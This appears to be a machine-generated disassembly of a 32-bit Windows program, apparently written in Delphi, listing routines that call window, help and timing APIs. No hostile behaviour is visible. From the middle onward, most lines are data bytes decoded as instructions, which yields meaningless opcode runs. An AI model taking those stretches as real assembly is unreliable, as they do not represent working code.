mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42fb54
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4085a8
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_42fbaf
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408584
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_42fc24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40434c
xor eax eax
push ebp
push sub_42fc9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_42fc08
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fca1
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407c30
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_42fcb0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_42fccc
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_42fc08
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_42fcac
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_42fcb0
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_42fd28
sub_42fd28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_42fda5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42f788
call GetTickCount
mov ebx eax
push 0x0
call sub_406280
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42f388
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fdac
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42fdb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403470
call sub_405774
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42fdfc
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_42fe28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fe96
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fe9d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_40575c
mov eax rw-data
call sub_40575c
mov eax rw-data
call sub_40575c
mov eax rw-data
call sub_403e9c
mov eax rw-data
call sub_40575c
mov eax [ rw-data ]
call sub_42f458
sub_42fea0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fef2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fef9
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42fdb4
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_40575c
mov edx eax
mov eax [ rw-data ]
call sub_425d24
sub_42fefc
add bh bh
inc edx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
cwde
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 8 - 0x1 ] si
inc edx
add [ ecx + edx ] bh
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
sbb al 0xff
inc edx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc ebx
add [ ebx ] cl
inc eax
add al bl
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jae r-xdata
add [ ecx + eax + 0x43 ] ch
add [ eax ] al
add [ eax ] al
xor [ eax ] al
inc ebx
add [ ebx + esi + 0x26f80040 ] dl
inc ebx
inc esp
jb r-xdata
inc ebx
add [ eax ] cl
daa
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax + 0x58004326 ] bl
daa
outsd
insb
jae r-xdata
inc [ edx ]
xor al 0x0
add [ eax ] al
call 0xffffffff94433fc9
xor eax [ eax ]
clc
inc ebx
add al ch
inc ebx
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] dh
and eax 0x26740043
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jb r-xdata
inc ebx
add al dl
daa
inc ebx
add [ ebp + 0x43 ] dh
add [ edi ] ch
inc ebx
add [ eax ] bh
and eax 0x27dc0043
inc ebx
add [ eax - 0x3ffbcda ] dl
inc ebx
outsd
outsb
je r-xdata
add al ch
add [ eax ] al
insb
add [ ebx ] eax
inc eax
add [ eax ] al
add [ eax ] dh
add [ ebx ] al
xchg esp eax
xor eax [ eax ]
clc
inc ebx
inc ebx
outsd
outsb
je r-xdata
add al ch
inc ebx
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi + 0x26740043 ] al
inc ebx
add [ eax + 0x26 ] dh
inc ebx
add [ ebp + 0x43 ] dh
add [ edi ] ch
inc ebx
add [ eax ] bh
and eax 0x268c0043
inc ebx
add [ eax - 0x67ffbcda ] dl
inc ebx
add [ eax + 0x27 ] bl
add [ ebx + 0x43007cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004300 ] ch
add [ eax ] al
add [ edi + edi * 8 + 0x33940042 ] cl
inc eax
add al bh
inc ebx
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
xor al 0xff
inc edx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax ] dh
inc [ edx ]
push es
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add ah bh
sub [ ebx ] eax
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
daa
inc ebx
add [ eax + 0x27 ] bl
inc ebx
add [ eax ] cl
daa
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
inc ebx
add ah bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x34 ] si
add [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
add [ ebx ] eax
inc eax
add [ eax ] al
add ah dh
add [ ebx ] al
xchg esp eax
xor eax [ eax ]
clc
inc ebx
add [ eax + ebp ] bl
inc ebx
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi + 0x27b80043 ] al
inc ebx
add [ eax - 0x63ffbfcd ] ch
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x3c ] si
add [ ebx ] al
pop es
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
aam 0x29
inc ebx
add al ch
sub [ ebx ] eax
or [ edx ] ch
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
inc ebx
add [ ebp + 0x43 ] dh
add [ eax + ebp + 0x25380043 ] dh
inc ebx
add [ esi + 0x26900043 ] cl
inc ebx
add [ eax + 0x10004326 ] bl
sub [ ebx ] eax
and [ eax ] ch
inc ebx
add [ eax + 0x29 ] bl
inc ebx
add ah dl
sub [ ebx ] eax
call 0x84345be
sub al [ ebx ]
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc ebx
add [ eax - 0x67ffbcda ] dl
inc ebx
add [ eax ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
pop esp
add al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
add al [ ebx ]
jo r-xdata
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi + 0x27b80043 ] al
pushfd
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc ebx
add [ eax + 0x26 ] dh
inc ebx
add [ ebp + 0x43 ] dh
add al bl
and al 0x43
add [ eax ] bh
and eax 0x268c0043
xor [ eax ] eax
push esp
xor [ eax ] eax
xor [ 0x26740043 ] ah
outsd
insd
inc ebx
add [ ebx + esi + 0x26f80040 ] dl
inc ebx
add [ eax ] dl
sub al [ ebx ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
test [ eax ] ch
inc ebx
add [ edi + 0x29fc0043 ] al
inc ebx
add [ eax + 0x26 ] dh
inc ebx
add [ ebp + 0x43 ] dh
add [ eax + ebp + 0x25380043 ] dh
inc ebx
add [ esi + 0x26900043 ] cl
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 4 + 0x2 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 2 + 0x2 ] si
inc ebx
add al al
add [ ebx ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x10004326 ] bl
sub [ ebx ] eax
and [ eax ] ch
inc ebx
add [ eax + 0x29 ] bl
inc ebx
add ah dl
sub [ ebx ] eax
call 0x8434682
sub al [ ebx ]
adc [ esp + eax * 2 + 0x72 ] edx
popad
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
mov esp 0x4303
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
add eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x3
inc ebx
add [ eax + eax ] ah
outsd
insb
jae r-xdata
add [ eax ] al
xor [ eax ] al
inc ebx
add [ ebx + esi + 0x26f80040 ] dl
inc ebx
add al ch
inc ebx
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax + ebp + 0x27840043 ] al
daa
inc ebx
add [ ebp + 0x43 ] dh
add [ edi ] ch
inc ebx
add [ eax ] bh
and eax 0x27dc0043
inc ebx
add [ eax - 0x3ffbcda ] dl
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
test [ edi ] ah
inc ebx
add [ eax - 0x2fffbcd9 ] bh
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x67ffbcda ] dl
mov [ esi ] fs
je r-xdata
jbe r-xdata
inc ebx
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
add [ ebx + 0x430320c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax + 0x43 ] bl
add [ eax ] dh
add [ eax ] al
adc [ edx ] al
inc ebx
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 2 ] si
inc ebx
add [ eax ] cl
add [ ebx ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
push esp
inc esp
jb r-xdata
inc ebx
add [ esi + 0x26900043 ] cl
inc ebx
add [ eax + 0xb004326 ] bl
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
adc al 0xcd
inc ecx
add [ eax + 0x3e ] dl
jae r-xdata
outsd
add [ eax + esi * 2 + 0x51c0041 ] bh
inc edx
add [ eax ] cl
add eax 0x3c0c0042
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
daa
inc ebx
add [ eax + 0x27 ] bl
inc ebx
add [ eax ] cl
daa
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc ebx
add ah bh
outsd
insb
jae r-xdata
xor [ eax ] eax
loopne r-xdata
outsb
je r-xdata
add eax [ ebx ]
mov dl ah
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
inc ecx
add [ edi + edi + 0x43 ] bl
add [ ebx + edx ] bh
inc esp
add al dl
aas
inc ebx
add [ ebx + edx + 0x44 ] ah
add [ eax + 0x13 ] bh
inc esp
add [ eax + 0x41 ] cl
inc ebx
add [ eax + eax * 2 ] al
inc ebx
add [ ebx + edx + 0x13c80044 ] dh
inc esp
add [ eax + eax * 2 ] bh
inc ebx
add al dh
adc eax [ eax + eax - 0x68 ]
inc eax
inc ebx
add al bh
adc eax [ eax + eax - 0x48 ]
inc eax
inc ebx
add [ eax ] al
adc al 0x44
add ah cl
inc ecx
inc ebx
add [ ecx + eax * 2 + 0x41ec0043 ] ch
inc ebx
add al bl
inc eax
inc ebx
add [ esp + edx ] dl
inc esp
add [ eax ] bl
adc al 0x44
add ah bh
inc eax
inc ebx
add [ esi + edi + 0x43 ] ch
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ eax - 0x33 ] cl
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx * 8 + 0x3e500041 ] dl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebp + 0x1400040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4304f090
add [ ebx ] al
or al 0x54
add [ ebp + 0x45c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add al 0x43
add [ eax + eax ] bl
add [ eax ] al
hlt
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
jae r-xdata
add [ ebp + eax + 0x64060043 ] dh
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ edx ] bl
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_434688
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add eax [ ebx ]
add [ fs : eax ] al
call 0x74346ec
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ esi + eax + 0x43 ] bl
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ecx
add [ eax + 0x40 ] dh
inc ebx
add [ ebp + ecx * 8 + 0x41 ] bh
add [ ecx + eax * 2 ] bl
inc ebx
add ah cl
int3
outsd
insb
inc ebx
popad
outsb
cmp eax 0x71a80043
inc ecx
add [ eax + esi * 2 + 0x3e3c0041 ] bh
add [ eax ] edx
push es
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x5 ] ch
inc ebx
add [ ebx ] cl
jae r-xdata
in al dx
add eax 0x9010043
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
add al 0x43
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul eax [ edx + esi * 2 + 0x61 ] 0x67
add eax 0x64060043
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shr [ ebp + eax + 0x43 ] 0x0
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
mov al 0x3d
inc ebx
add [ ecx ] al
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
mov al 0x3d
inc ebx
inc ebx
outsd
outsb
jae r-xdata
add [ eax - 0x43ffbe8f ] ch
jo r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
push esp
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
inc ebp
outsb
je r-xdata
inc eax
add [ ebx + esi + 0x33a80040 ] ah
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
je r-xdata
push es
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
insb
add [ eax + eax ] dl
add bh bh
mov al 0x3d
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
rol [ edi ] 0x43
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43066c74
jb r-xdata
popad
js r-xdata
jb r-xdata
je r-xdata
inc ebx
add [ edi + 0x54100043 ] ch
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add [ esi + edi ] bh
jb r-xdata
jb r-xdata
inc ebx
add [ eax + 0x3d ] ch
inc ebx
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
test al 0x33
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
add eax 0x9030043
push esp
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x430838c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push es
inc ebx
add [ eax ] dl
add [ eax ] al
push [ eax + 0x100433d ]
add [ ecx + ecx * 2 ] dh
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
imul ebp [ esi + 0x74 ] 0x4306d873
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
add al 0x7
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
inc ebx
outsd
insb
jae r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x614c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
dec esp
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0xa8004010
inc ecx
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
je r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push 0x53746669
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax ] cl
add [ eax ] al
push [ eax + 0x100433d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ esi + eax + 0x43 ] ch
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
adc al 0x6
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
mov eax 0x3004305
insb
push esp
dec ebx
jns r-xdata
add [ ecx + edx ] bh
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ eax - 0x6fffbebf ] ch
call 0x8434bf1
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
popad
pop eax
pop es
dec ecx
outsb
add [ ecx ] al
je r-xdata
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
je r-xdata
inc edx
jne r-xdata
imul esp [ edi + 0x68 ] 0x43066c74
imul esp [ gs : edi + 0x68 ] 0x43066c74
add [ eax + eax ] cl
add bh bh
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax ] dl
push es
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ ecx + edx ] bh
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push cs
inc ebx
add [ eax ] cl
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + 0x64080043 ] ch
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x3004305 ] bh
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
cmp al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
cmp al 0x11
inc eax
add [ eax + 0x3c004141 ] ch
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0x89c0040 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
or [ esi ] cl
jbe r-xdata
cmp al 0x11
inc eax
add ah ch
add al 0x43
add [ eax + 0x3c004141 ] ch
